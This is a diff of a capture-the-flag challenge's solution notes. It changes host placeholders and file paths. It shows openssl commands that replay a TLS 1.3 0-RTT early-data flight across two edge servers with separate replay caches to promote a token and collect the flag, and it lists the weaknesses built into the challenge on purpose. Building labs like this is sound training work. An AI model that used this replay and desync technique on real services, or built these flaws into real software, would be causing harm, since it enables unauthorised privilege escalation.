@@ -80,19 +80,19 @@ printf 'GET /warm HTTP/1.1\r\nHost: lab\r\n\r\nGET /promote HTTP/1.1\r\nHost: la
 
 # 0) full handshake -> capture a ticket that advertises early_data
 { printf 'GET / HTTP/1.1\r\nHost: lab\r\n\r\n'; sleep 1; } \
-  | openssl s_client -connect HOST:443 -servername lab -tls1_3 -sess_out sess.pem
+  | openssl s_client -connect CHALLENGE_HOST:32002 -servername lab -tls1_3 -sess_out sess.pem
 
 # 1) replay the flight (edge A) -> step 1
-sleep 1 | openssl s_client -connect HOST:443 -servername lab -tls1_3 -sess_in sess.pem -early_data flight.bin
+sleep 1 | openssl s_client -connect CHALLENGE_HOST:32002 -servername lab -tls1_3 -sess_in sess.pem -early_data flight.bin
 # 2) replay the SAME flight (round-robin -> edge B, cold cache) -> step 2, admin
-sleep 1 | openssl s_client -connect HOST:443 -servername lab -tls1_3 -sess_in sess.pem -early_data flight.bin
+sleep 1 | openssl s_client -connect CHALLENGE_HOST:32002 -servername lab -tls1_3 -sess_in sess.pem -early_data flight.bin
 
 # 3) collect, same token
 { printf 'GET /flag HTTP/1.1\r\nHost: lab\r\nX-Token: %s\r\n\r\n' "$TOK"; sleep 1; } \
-  | openssl s_client -connect HOST:443 -servername lab -tls1_3
+  | openssl s_client -connect CHALLENGE_HOST:32002 -servername lab -tls1_3
 ```
 
-`solver/solve.py` is this, wrapped in a retry loop (round-robin isn't something
+`solve/solve.py` is this, wrapped in a retry loop (round-robin isn't something
 the client controls, so it just keeps sending the flight until step 2 lands). It
 shells out to `openssl s_client -early_data` because Python's stdlib `ssl` has no
 0-RTT API.
@@ -144,13 +144,13 @@ only road to the flag is desync + cross-instance 0-RTT replay.
 
 Every intentional weakness is commented in-source with a `VULN` banner:
 
-- **Desync (edge):** `front/front.c` → `tag_first_request()` — tags request #1
+- **Desync (edge):** `src/front/front.c` → `tag_first_request()` — tags request #1
   only, splices the rest of the early-data buffer raw.
-- **Replay-cache partition (edge):** `front/front.c` → `replay_seen_or_record()`
+- **Replay-cache partition (edge):** `src/front/front.c` → `replay_seen_or_record()`
   and the `replay_node` list — per-process cache that should have been shared.
-- **Per-request 425 guard (origin):** `backend/main.go` → the `/promote` case —
+- **Per-request 425 guard (origin):** `src/backend/main.go` → the `/promote` case —
   reads the per-request `Early-Data` header instead of the connection taint.
 - **Anti-cheese controls to keep intact:** connection-level `/promote` authz
-  (`403` otherwise) in `backend/main.go`; `strip_early_data()` on the normal path
-  in `front/front.c`; the shared STEK via `ticket_key_cb` (same `ticket.key`
+  (`403` otherwise) in `src/backend/main.go`; `strip_early_data()` on the normal path
+  in `src/front/front.c`; the shared STEK via `ticket_key_cb` (same `ticket.key`
   mounted into both edges).
